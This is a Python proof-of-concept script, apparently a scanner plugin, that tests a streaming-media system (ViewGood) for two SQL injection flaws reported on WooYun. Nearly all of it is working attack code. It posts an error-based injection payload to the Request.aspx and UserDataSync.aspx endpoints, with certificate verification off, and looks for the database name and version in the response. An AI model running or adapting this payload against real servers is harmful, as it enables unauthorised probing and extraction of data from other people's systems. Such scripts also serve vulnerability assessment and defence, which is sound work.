#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 远古流媒体系统两处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0146427
author: Lucifer
description: 文件Request.aspx和UserDataSync.aspx中,POST参数存在SQL注入。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['古流媒体系统两处SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "user_name":"'AnD(Db_Name()+ChAr(66)+ChAr(66)+ChAr(66)+@@VeRSioN)>0--"
        }
        payload = "/viewgood/Pc/Content/Request.aspx?action=name_check"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl+"\tpost: "+json.dumps(post_data)
                return result
            vulnurl = url + "/VIEWGOOD/ADI/portal/UserDataSync.aspx"
            post_data = {
                "UserGUID":"1'AnD(Db_Name()+ChAr(66)+ChAr(66)+ChAr(66)+@@VeRSioN)>0--"
            }
            req = requests.get(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl+"\tpost: "+json.dumps(post_data)
                return result
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    